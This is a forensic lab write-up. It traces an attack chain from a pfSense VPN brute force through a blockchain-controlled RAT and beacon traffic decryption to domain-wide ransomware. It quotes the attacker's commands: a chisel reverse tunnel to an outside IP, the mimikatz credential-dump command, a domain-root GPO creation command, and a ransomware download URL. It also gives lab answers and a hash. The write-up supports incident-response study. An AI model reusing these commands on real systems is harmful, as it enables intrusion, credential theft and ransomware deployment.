## Description

Trace a real-world attack chain end to end — from a leaked VPN config to domain-wide ransomware. Along the way you will decode obfuscated malware, reverse-engineer a kernel exploit, crack beacon encryption, and reconstruct the attacker's every move from disk, memory, and network artifacts.

> ### ⚠️ NOTE
> This lab is currently `Active`. If you are working on it, try your best to solve it on your own until you are truly stuck before reading further.

## Network Diagram

![image](/assets/images20/diagram.png)

Having a network diagram like this makes it much easier to visualize the environment when tracing, especially during lateral movement phases.

## Solution

### Q1. The attack begins at the perimeter. What is the IP address responsible for the credential attack against the VPN gateway?

Checking `openvpn.log` => `3.72.68.129`

![](data:image/png;base64,)

### Q2. how many distinct usernames did the attacker attempt, and how many authentication attempts failed in total?

Still in `openvpn.log`, filtering by "could not authenticate" shows 19 distinct targeted accounts and a total of 380 failed attempts.

![](data:image/png;base64,)

### Q3. One account survived the brute-force attack by falling to it. What is that account, and using pfSense's serialized configuration in the tmp folder, what privilege is assigned to it?

At 17:51:02, we can see that user `vpnuser` successfully authenticated.

![](data:image/png;base64,) 

Checking `config.cache` in `/root/tmp`, searching for the `priv` field => `system-xmlrpc-ha-sync`

This privilege allows the user to use the **XMLRPC sync** mechanism to synchronize configurations between pfSense firewalls in an HA/cluster setup.

![](data:image/png;base64,)


### Q4. This pfSense version was vulnerable to a recent RCE CVE. By examining the logs, what is the CVE the attacker exploited and when did he first attempt to exploit it?

Checking `/etc/version` confirms the system is running pfSense CE **2.7.2-RELEASE**.

Looking up CVEs related to pfSense CE 2.7.2/2.8.0 reveals two CVEs published by researcher Nelson Adhepeau (02/2026):

- CVE-2025-69690 — Unsafe Deserialization via Backup/Restore → RCE (2.7.2)
- CVE-2025-69691 — XMLRPC exec_php → RCE (2.8.0)

Filtering `nginx.log` for requests to `/xmlrpc.php` from account `vpnuser` shows all activity concentrated on `/xmlrpc.php` — matching the attack pattern of CVE-2025-69691.

![](data:image/png;base64,)

_Note: Although CVE-2025-69691 is documented for 2.8.0, pfSense 2.7.2 here still exposes the XMLRPC endpoint with the same vulnerability, allowing successful exploitation._

### Q5. After gaining root, the attacker dropped a file to establish a foothold independent of the channel he had been using. What is the name of that file, and what is the name of the RAT it downloads and launches?

In `/root/tmp`, we discover the dropper file `x4mwv.sh` and the RAT file `.b7x9kqm2.php`.

![](data:image/png;base64,)

To confirm the actual behavior of `x4mwv.sh`, I replaced all `eval` with `echo` and re-executed the script.

![](data:image/png;base64,)

As for `.b7x9kqm2.php`, this is a blockchain-based RAT using Ethereum smart contracts as its C2 channel. The file is heavily obfuscated.

![](data:image/png;base64,)

Summary of execution flow after deobfuscation:

```
┌───────────┐
│ STARTUP   │
└───────────┘
     │
     ▼
Generate Bot ID = md5(hostname + username)[:16]
     │
     ▼
┌───────────────────────────────────────────────┐
│ Read C2 URL from Ethereum smart contract      │
│                                               │
│ • Call eth_call to contract 0x5351...         │
│ • Try RPC endpoints: llamarpc → publicnode    │
│   → flashbots → drpc                          │
│ • Contract returns actual C2 server HTTP URL  │
└───────────────────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────┐
│ MAIN LOOP (every 60 seconds)             │
│                                          │
│ GET {C2_URL}/api/{random_nonce}/{bot_id} │
│   ├─► Server returns shell command       │
│   └─► shell_exec(command)                │
│         ↳ executes as root               │
└──────────────────────────────────────────┘
                     │
                     ▼
               Failed 3 times?
              /            \
           Yes                 No
            │                 │
            ▼                 ▼
    Re-fetch C2 URL from    Repeat MAIN LOOP
    blockchain, then back
    to read C2 URL step
```

### Q9. The attacker started a reverse tunnel on the firewall to reach the internal network. What is the PID of the tunneling process, and which socket does it hold open?

The screenshot below only proves the PID: process `83381` is `/var/tmp/chisel client http://3.72.68.129:9001 R:socks`, the reverse tunnel. 

It does not show the socket, as I forgot to capture that step. After identifying the PID, I listed the open sockets held by that process, which returned `/var/run/php-fpm.socket`. 

Chisel likely inherited it from php-fpm, since it was launched through the `XMLRPC` exploit.


![](data:image/png;base64,)

`Answer: 83381, /var/run/php-fpm.socket`

### Q16. The attacker repeated the same play on each workstation — pivot in, escalate locally, launch the beacon as SYSTEM. What is the PID of the beacon process on each of the three workstations?

Tracing similarly to workstation 01 easily yields the PIDs and pipe names across the machines: `MSSE-6606-server`, `MSSE-4634-server`, and `MSSE-9832-server`.

 

### Q17. The beacon encrypts everything it sends to the C2. To read the operator's transcript you first need its symmetric key material. What is the first workstation beacon's SHA256 raw key (the HMAC:AES key pair)?

Checking the beacon config reveals the C2 IP is `63.183.201.192`.

![](data:image/png;base64,)

The beacon uses a Malleable C2 profile that disguises server responses as Facebook Pixel JavaScript. The real payload is hidden inside the `fbq('init', ...)` parameter, encoded with Base64URL and an XOR mask, containing the AES/HMAC ciphertext.

The beacon checks in every 60 seconds (0 jitter) via `GET /content/config.json` and submits results via `POST /api/v2/push`.

Example:

![](data:image/png;base64,)

Based on the beacon config and the provided PCAP file, we extract the ciphertext from `fbq('init', ...)`, perform XOR + Base64 decoding to recover the clean ciphertext => convert to hex. This serves as the input to extract the HMAC/AES raw keys from process memory.

Analyzing the memory dumps, we dump the full memmap for all three `control.exe` processes across the workstations, with PIDs `3776`, `12200`, and `10960` respectively.

Next, strip the wrapper layer from a C2 response to get the ciphertext (hex), then use the tool:
`cs-extract-key.py -t <ciphertext> control.exe.dmp` to search for keys in process memory. The tool recovers the raw HMAC:AES key pair. Repeat for the other two PIDs (`12200`, `10960`). 


We obtain the following raw key pairs for each beacon:

| Hostname | PID | HMAC/AES raw key |
|---|---:|---|
| WKSTN-01 | 3776 | `130578d3c942b468606ca68f18c0c8a2:7f644391609e19f954c4b7ffaac9fdfa` |
| WKSTN-02 | 12200 | `0358fc837133c99d5aae59f87ea5b65c:7d6ad5851d4043b2bbc3912ea7c756d6` |
| WKSTN-03 | 10960 | `3225827d18f3093a99dab96334ce7faf:bd89867ac6f4098632ae00b6b62e1f6f` |


### Q18. We need to find what was sent from all beacons to the C2. How many files did the attacker exfiltrate in total, and which file was the last one stolen?

Having obtained the raw keys, standard decryption tools still failed to decrypt the traffic. The reason is that the ciphertext is wrapped by a Malleable C2 profile (faking Facebook Pixel), which default tools do not understand. 

![](data:image/png;base64,)

Therefore, I used a custom script to strip the wrapper first (trimming the first 388 bytes, trailing 27 bytes, Base64 URL-safe decoding, removing the XOR mask), then verify HMAC and decrypt AES to extract the command contents and exfiltrated data.

```python
#!/usr/bin/env python3
# decrypt_all.py  -  pip install pycryptodome ; requires tshark in PATH
import re, os, base64, hmac, hashlib, struct, subprocess
from datetime import datetime, timezone
from collections import Counter
from Crypto.Cipher import AES
 
# ================= CONFIG =================
PCAP, C2, OUT = "traffic.pcap", "63.183.201.192", "out"
STRIP_BEGIN, STRIP_END = 388, 27            # from beacon config (fallback if regex does not match)
IV = b"abcdefghijklmnop"
HOSTS = {"10.10.11.125": "WKSTN-01", "10.10.11.218": "WKSTN-02",
         "10.10.11.188": "WKSTN-03", "10.10.11.57": "DC01"}
# (label, host IP, key1 hex, key2 hex) - either HMAC/AES order works
KEYS = [
    ("WKSTN-01", "10.10.11.125", "130578d3c942b468606ca68f18c0c8a2", "7f644391609e19f954c4b7ffaac9fdfa"),
    ("WKSTN-02", "10.10.11.218", "0358fc837133c99d5aae59f87ea5b65c", "7d6ad5851d4043b2bbc3912ea7c756d6"),
    ("WKSTN-03", "10.10.11.188", "3225827d18f3093a99dab96334ce7faf", "bd89867ac6f4098632ae00b6b62e1f6f"),
]
CB_FILE, CB_FILE_WRITE, CB_FILE_CLOSE = 2, 8, 9     # callback types related to file transfer
TASK_STR_LIMIT = 3000                               # args larger than this limit are only written to file, not printed
# ============================================
 
def hexkey(s):
    try: return bytes.fromhex(s)
    except ValueError: return None
KEYS = [(l, ip, hexkey(a), hexkey(b)) for l, ip, a, b in KEYS]
KEYS = [k for k in KEYS if k[2] and k[3]]          # skip unfilled keys
 
WRAP = re.compile(rb"fbq\('init','([A-Za-z0-9_\-=]*)'\);fbq\('track'")
u32 = lambda b: struct.unpack(">I", b)[0]
 
def unmask(payload):
    payload = payload.strip()
    d = base64.urlsafe_b64decode(payload + b"=" * (-len(payload) % 4))
    if len(d) <= 4: return None                     # empty response
    return bytes(b ^ d[i % 4] for i, b in enumerate(d[4:]))
 
def check(seg, h, a):
    if len(seg) < 32 or (len(seg) - 16) % 16: return None
    enc, mac = seg[:-16], seg[-16:]
    if hmac.new(h, enc, hashlib.sha256).digest()[:16] != mac: return None
    return AES.new(a, AES.MODE_CBC, iv=IV).decrypt(enc)
 
def try_keys(seg, prefer_ip):
    for label, ip, k1, k2 in sorted(KEYS, key=lambda k: k[1] != prefer_ip):
        for h, a in ((k1, k2), (k2, k1)):
            pt = check(seg, h, a)
            if pt: return label, pt
    return None, None
 
def unpack(blob, ip):
    """Returns list of (label, plaintext). Tries multiple packets [len4][data], then single block."""
    out, i = [], 0
    while i + 4 <= len(blob):
        n = u32(blob[i:i+4])
        if n <= 0 or i + 4 + n > len(blob): break
        lab, pt = try_keys(blob[i+4:i+4+n], ip)
        if not pt: break
        out.append((lab, pt)); i += 4 + n
    if out: return out
    for off in (0, 4):
        lab, pt = try_keys(blob[off:], ip)
        if pt: return [(lab, pt)]
    return []
 
def strings(d, minlen=6):
    a = [s.decode() for s in re.findall(rb"[\x20-\x7e]{%d,}" % minlen, d)]
    u = [s.decode("utf-16le") for s in re.findall(rb"(?:[\x20-\x7e]\x00){%d,}" % minlen, d)]
    return a + u
 
def safe(s): return re.sub(r"[^\w.\-]", "_", s)[-80:]
 
for sub in ("files", "text", "tasks"): os.makedirs(f"{OUT}/{sub}", exist_ok=True)
 
cmd = ["tshark", "-r", PCAP, "-Y", f"http && ip.addr=={C2} && http.file_data",
       "-T", "fields", "-E", "separator=/t", "-e", "frame.number", "-e", "frame.time_epoch",
       "-e", "ip.src", "-e", "ip.dst", "-e", "http.request.method", "-e", "http.request.uri",
       "-e", "http.response.code", "-e", "http.file_data"]
rows = subprocess.run(cmd, capture_output=True, text=True).stdout.splitlines()
 
files, fails, stats, texts, tasks = {}, [], Counter(), [], []
for line in rows:
    n, t, src, dst, meth, uri, code, hx = (line.split("\t") + [""] * 8)[:8]
    if not hx: continue
    n = int(n); body = bytes.fromhex(hx.replace(":", ""))
    is_resp = bool(code)
    if not is_resp and meth != "POST": continue
    ip = dst if is_resp else src
    when = datetime.fromtimestamp(float(t), timezone.utc).strftime("%H:%M:%S")
    sid = (re.search(r"id=(\d+)", uri) or [0, "-"])[1]
    host = HOSTS.get(ip, ip)
    try:
        if is_resp:
            m = WRAP.search(body)
            blob = unmask(m.group(1) if m else body[STRIP_BEGIN:-STRIP_END])
        else:
            blob = unmask(body)
    except Exception as e:
        fails.append((n, host, f"unmask error: {e}")); continue
    if blob is None: stats["empty"] += 1; continue
    pkts = unpack(blob, ip)
    if not pkts:
        fails.append((n, host, f"{'TASK' if is_resp else 'POST'} sid={sid} len={len(blob)}")); continue
 
    for lab, pt in pkts:
        stats["OK"] += 1
        a, ln = struct.unpack(">II", pt[:8]); data = pt[8:8+ln]
 
        if is_resp:                                  # ---- TASK: [id4][len4][args] repeated
            i, k = 0, 0
            while i + 8 <= len(data):
                tid, alen = struct.unpack(">II", data[i:i+8]); args = data[i+8:i+8+alen]; i += 8 + alen; k += 1
                open(f"{OUT}/tasks/{host}_{n}_{k}_id{tid}.bin", "wb").write(args)
                tasks.append((n, host, tid, alen))
                print(f"[{when}] {n} {host} TASK id={tid} args={alen}B key={lab}")
                if alen < TASK_STR_LIMIT:
                    for s in strings(args)[:10]: print("      ", s[:200])
        else:                                        # ---- POST: [cb4][payload]
            cb = u32(data[:4]); p = data[4:]
            print(f"[{when}] {n} {host} POST sid={sid} cb={cb} {len(p)}B key={lab}")
            if cb == CB_FILE:
                rid, size = struct.unpack(">II", p[:8])
                name = p[8:].decode(errors="replace").rstrip("\x00")
                path = f"{OUT}/files/{host}_{rid}_{safe(name.split(chr(92))[-1])}"
                open(path, "wb").close()             # create/overwrite to avoid appending on rerun
                files[(ip, rid)] = dict(frame=n, host=host, name=name, size=size, got=0, close=None, path=path)
                print(f"      FILE: {name}  ({size} byte)")
            elif cb == CB_FILE_WRITE:
                rid = u32(p[:4]); chunk = p[4:]
                f = files.get((ip, rid))
                if f:
                    f["got"] += len(chunk)
                    open(f["path"], "ab").write(chunk)
            elif cb == CB_FILE_CLOSE:
                f = files.get((ip, u32(p[:4])))
                if f: f["close"] = n
            else:
                txt = p.decode("utf-8", "replace")
                texts.append((n, host, cb, txt))
                open(f"{OUT}/text/{host}_{n}_cb{cb}.txt", "w", encoding="utf-8").write(txt)
 
# ================= SUMMARY =================
print("\n" + "=" * 20, "SUMMARY", "=" * 20)
print("Stats:", dict(stats), "| failed:", len(fails))
for f in fails: print("   ", f)
 
print(f"\nFILE EXFIL: {len(files)}")
for f in sorted(files.values(), key=lambda x: x["frame"]):
    ok = "COMPLETE" if f["got"] == f["size"] else f"INCOMPLETE/MISMATCH (got={f['got']})"
    print(f"  frame {f['frame']} {f['host']} size={f['size']} {ok} close={f['close']}  {f['name']}")
if files:
    print("Last file (by start frame):", max(files.values(), key=lambda x: x["frame"])["name"])
    cl = [f for f in files.values() if f["close"]]
    if cl: print("Last file (by close frame):", max(cl, key=lambda x: x["close"])["name"])
 
print(f"\nTASK ({len(tasks)}):")
for n, host, tid, alen in tasks: print(f"  frame {n} {host} id={tid} args={alen}B")
 
print(f"\nBEACON OUTPUT TEXT ({len(texts)}) - see details in {OUT}/text/:")
for n, host, cb, txt in texts:
    first = next((l.strip() for l in txt.splitlines() if l.strip()), "")
    print(f"  frame {n} {host} cb={cb} {len(txt)}B  {first[:100]}")
```


![](data:image/png;base64,)

Decrypting all beacon traffic to the C2, we recover 4 exfiltrated files, with the last file stolen from `WKSTN-03`.

`Answer: 4, Board_Finance_Report_Q2_2026_DRAFT.pdf`

### Q19. What was the exact beacon command the operator issued to harvest credentials from each host?

From the decrypted beacon output, we retrieve the command, which the attacker executed across all three workstations:

![](data:image/png;base64,)

`Answer: mimikatz sekurlsa::logonpasswords`

### Q20. The attacker kept moving from one workstation to the next and did not stop until they had dumped the NTLM hash of a domain administrator account. Who is that user, and what is their NTLM hash?

From the Mimikatz output across the three workstations, each machine exposes a new user:

- `fatima.nasser` on `WKSTN-01`
- `omar.saleh` on `WKSTN-02`
- `khalid.almansour` on `WKSTN-03`

After this dump, the attacker did not pivot to any other workstation, but moved directly to `DC01`, matching the clue "stop once they have dumped the NTLM hash of a domain administrator".

![](data:image/png;base64,)

To prove that this user belongs to the Domain Admins group, we inspect the PCAP (since Security logs are insufficient for full tracing):

1. The hash successfully authenticates to `DC01`. At 20:42:37, the attacker attempted `DA_USER` and was rejected (`STATUS_LOGON_FAILURE`, frame 409249). At 20:43:07, `khalid` authenticated via SMB successfully (frame 409619, response 409620 with `nt_status = 0x00000000`). This is Pass-the-Hash: no plaintext password, only the hash dumped from `WKSTN-03`.

![](data:image/png;base64,)

2. Immediately after, from this session, the attacker escalated to SYSTEM on `DC01`.

![](data:image/png;base64,)

They created a service named `bgxf` pointing to an executable containing a `cmd shell`. Since Windows services run under `SYSTEM` by default, successful execution grants SYSTEM privileges — confirming that this user must be a member of the Domain Admins group to perform this action.

`Answer: khalid.almansour, 63c0cab90fdf93002a7a876a6f9c8eb6`

### Q21. Having exfiltrated the files he targeted and obtained domain admin privileges, the attacker's next goal was ransom. He used a single centralized mechanism to deploy it across the domain. What is the MITRE ATT&CK technique ID of that method, and what name did he give the object he created?

To deploy malware quickly across the entire domain, the easiest approach is configuring GPO — creating or modifying a GPO to push scheduled tasks or startup scripts that execute the payload on all machines => `T1484.001`.

Filtering by `New-GPO` reveals the complete command that creates the GPO and links it directly to the domain root => enforcing the policy across all domain-joined machines:

```powershell
powershell -c "New-GPO -Name 'WindowsUpdate-KB5041' | New-GPLink -Target 'DC=ancientland DC=local' -LinkEnabled Yes"
```

### Q22. To run the ransomware across the workstations, the attacker executed commands remotely from one host to the others. What lateral-execution tool did they use?

Sorting by the attack timeline reveals the artifacts identifying the lateral movement tool. The parent process is `WmiPrvSE.exe`, executing commands in the format `cmd.exe /Q /c ... \\\\127.0.0.1\\ADMIN\$\\\__<number>`.

`Answer: wmiexec`

### Q23. Give the full URL the ransomware payload was downloaded from, and what is the SHA1 of that ransomware?

By continuing to sort the events by timeline, we can easily identify the payload that was downloaded.

`Answer: http://3.72.68.129:9999/lock.exe, 4F3AED88BEB4CC34D9DFA874A1463A333E8F2B1E`

### Q24. What is the ransom-note filename and (based only on filesystem artifacts) what is the total number of note instances written across the three workstations?

![](data:image/png;base64,)


Checking parent process `C:\\Temp\\updater.exe`, we see it generates the file `DClEkdhD5.README.txt` upon execution. Checking Event ID 11 (File Created) in the logs shows 2,007 instances, but parsing the `\$MFT` totals 2,456 instances => the answer.

`Answer: DClEkdhD5.README.txt, 2456`

Based on threat intelligence, this ransomware sample is identified as Lockbit 5.0. Finding the sample and analyzing it on ANY.RUN reveals the unique victim identifier in the ransom note:

## MITRE ATT&CK

| Tactic | ID | Technique | Evidence | Q |
| --- | --- | --- | --- | --- |
| Initial Access | T1133 | External Remote Services | Leaked `.ovpn` config used to reach the VPN gateway | 1 |
| Initial Access | T1190 | Exploit Public-Facing Application | `/xmlrpc.php` exploited on pfSense to gain root | 4 |
| Initial Access | T1078.003 | Valid Accounts: Local Accounts | VPN login as `vpnuser` | 3 |
| Credential Access | T1110.001 | Brute Force: Password Guessing | 19 usernames, 380 failed attempts in `openvpn.log` | 1-2 |
| Execution | T1059.004 | Command and Scripting Interpreter: Unix Shell | Dropper `x4mwv.sh` | 5 |
| Defense Evasion | T1027 | Obfuscated Files or Information | Obfuscated RAT `.b7x9kqm2.php`, `eval`-based script | 5 |
| Persistence | T1037.004 | Boot or Logon Initialization Scripts: RC Scripts | `nohup` command added to `rc.bootup` | 8 |
| Command and Control | T1102.001 | Web Service: Dead Drop Resolver | RAT reads C2 URL from Ethereum smart contracts | 6-7 |
| Command and Control | T1008 | Fallback Channels | Re-queries the blockchain after 3 failed check-ins | 5 |

## Conclusion

![](data:image/png;base64,)

A great lab that covers the entire attack chain end-to-end — from the `DMZ` (pfSense VPN Gateway) into the `Internal` network (Active Directory domain), concluding with domain-wide `ransomware` deployment.
